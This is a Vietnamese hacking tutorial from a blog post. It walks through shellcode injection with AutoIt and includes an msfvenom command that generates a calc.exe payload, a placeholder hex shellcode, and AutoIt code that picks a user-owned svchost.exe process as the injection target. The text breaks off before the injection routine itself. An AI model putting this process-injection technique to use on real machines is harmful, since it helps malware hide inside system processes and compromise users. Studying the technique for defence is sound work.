# Cách thực hiện kĩ thuật tấn công Shellcode Injection với Autoit

**Tác giả:** Thanh Kim  
**Danh mục:** Basic Hacking  
**Ngày đăng:** 08/03/2025  
**URL gốc:** https://anonyviet.com/cach-thuc-hien-ki-thuat-tan-cong-shellcode-injection-voi-autoit/

## Khám phá kỹ thuật Shellcode Injection với AutoIt: chèn mã độc vào tiến trình, thực thi lệnh nguy hại. Hiểu để phòng thủ trong an ninh mạng!

Việc hiểu rõ các kỹ thuật tấn công là một phần quan trọng để phát triển các biện pháp phòng thủ hiệu quả. Một trong những phương pháp tấn công nổi bật là **Shellcode Injection**, cho phép hacker chèn mã độc trực tiếp vào bộ nhớ của chương trình đang chạy để thực thi các lệnh độc hại. Kết hợp với AutoIt là một ngôn lập trình dễ sử dụng làm cho kỹ thuật này trở nên linh hoạt và nguy hiểm hơn bao giờ hết.

**Lưu ý:** Bài viết này chỉ dành cho mục đích giáo dục, nghiên cứu và học tập. Anonyviet không chịu trách nhiệm trước mọi hành vi bất hợp pháp

## **Shellcode Injection là gì ?**

Trước khi đi vào chi tiết, hãy cùng tìm hiểu khái niệm cơ bản. Shellcode là một đoạn mã nhị phân nhỏ, thường được viết bằng ngôn ngữ Assembly, nhằm mục đích thực thi một tác vụ cụ thể (như mở shell, tải phần mềm độc hại,…). Shellcode Injection là quá trình chèn đoạn mã này vào bộ nhớ của một tiến trình đang chạy, sau đó buộc tiến trình đó thực thi mã.

Với khả năng thao tác bộ nhớ và gọi các hàm API của Windows, Autoit là ngôn ngữ lập trình lý tưởng để thực hiện kỹ thuật này. Chúng ta sẽ tận dụng các hàm có sẵn trong các thư viện của Autoit để tương tác với hệ thống

## **Cách thực hiện kĩ thuật Shellcode Injection**

### **1. Chuẩn bị môi trường**

Để bắt đầu, bạn cần chuẩn bị những thứ sau:

- **Tải và cài đặt AutoIt:** Đảm bảo bạn có cả trình soạn thảo SciTE để viết code
- **Shellcode:** Bạn có thể tạo shellcode bằng các công cụ như Metasploit (msfvenom) hoặc tự viết bằng Assembly. Ví dụ, dùng lệnh sau trong Metasploit để tạo shellcode mở calculator

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f hex
```

Kết quả sẽ là một chuỗi hex như: fc4883e4…32e65786500

- **Kiến thức cơ bản:** Hiểu về hàm API Windows như VirtualAlloc, RtlMoveMemory, và CreateThread

### **2. Viết code Autoit thực hiện kĩ thuật Shellcode Injection**

#### **Phần khai báo thư viện**

```autoit
#include <Process.au3>
#include <Memory.au3>
#include <WinAPI.au3>
#include <Array.au3>
```

Đây là các thư viện (library) mà AutoIt sử dụng để cung cấp các hàm hỗ trợ:

- <Process.au3>: Hỗ trợ làm việc với tiến trình (process), như lấy tên, kiểm tra PID.
- <Memory.au3>: Cung cấp hàm để thao tác bộ nhớ, như cấp phát hoặc ghi dữ liệu.
- <WinAPI.au3>: Cho phép gọi các hàm API của Windows (như OpenProcess, WriteProcessMemory).
- <Array.au3>: Hỗ trợ làm việc với mảng (array), dùng để quản lý danh sách tiến trình.

#### **Khai báo biến toàn cục**

```autoit
Global $hexShellcode = "fc4883e4...32e65786500"
```

$hexShellcode là shellcode dạng mã hexa (chuỗi số và chữ cái như fc4883e4f). Đây là đoạn mã nhỏ sẽ được tiêm vào tiến trình đích để thực thi

#### **Gọi các hàm chính**

```autoit
_CheckProcess()
_ProcessInjection()
```

Hai hàm này chính là "đầu não" của chương trình:

- _CheckProcess(): Kiểm tra xem tiến trình đích (svchost.exe) có đang chạy không
- _ProcessInjection(): Thực hiện việc tiêm shellcode vào tiến trình svchost.exe

#### **Hàm _CheckProcess()**

```autoit
Func _CheckProcess()
    ConsoleWrite("[+] Checking for target process" & @CRLF & @CRLF)

    Global $targetPID = Find_Process("svchost.exe")

    If Not $targetPID = 0 Then
        Global $targetProcName = _ProcessGetName($targetPID)
        ConsoleWrite("[+] Target process is running (" & $targetProcName &")" & @CRLF & @CRLF)
    ElseIf $targetPID = 0 Then
        ConsoleWrite("[!] Target process is not running. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf
EndFunc
```

Hàm này kiểm tra xem tiến trình svchost.exe có đang chạy không và lấy mã định danh (PID) của nó

Chi tiết:

- **ConsoleWrite("[+] Checking for target process" & @CRLF & @CRLF):** In thông báo "Đang kiểm tra tiến trình đích"
- **$targetPID = Find_Process("svchost.exe"):** Gọi hàm Find_Process để tìm PID của svchost.exe
- **If Not $targetPID = 0:** Nếu tìm thấy PID (khác 0):
  - **$targetProcName = _ProcessGetName($targetPID):** Lấy tên tiến trình từ PID
  - In thông báo xác nhận tiến trình đang chạy
- **ElseIf $targetPID = 0:** Nếu không tìm thấy, in thông báo lỗi và thoát chương trình (Exit)

#### **Hàm Find_Process()**

```autoit
Func Find_Process($process)
    $loggedInUser = @UserName
    $processList = ProcessList()
    Dim $matchingProcesses[1]

    For $i = 1 To $processList[0][0]
        $processName = $processList[$i][0]
        $processPID = $processList[$i][1]

        If StringInStr($processName, $process) And _IsProcessOwner($processPID, $loggedInUser) Then
            ReDim $matchingProcesses[UBound($matchingProcesses) + 1]
            $matchingProcesses[UBound($matchingProcesses) - 1] = $processPID
        EndIf
    Next

    If UBound($matchingProcesses) > 1 Then
        $randomIndex = Random(1, UBound($matchingProcesses) - 1, 1)
        $randomPID = $matchingProcesses[$randomIndex]
        Return $randomPID
    Else
        Return ""
    EndIf
EndFunc
```

Hàm này tìm tất cả các tiến trình có tên chứa **$process** (ở đây là "svchost.exe") và chọn ngẫu nhiên một PID thuộc về người dùng hiện tại.

**Bài viết được thu thập từ AnonyViet - https://anonyviet.com/**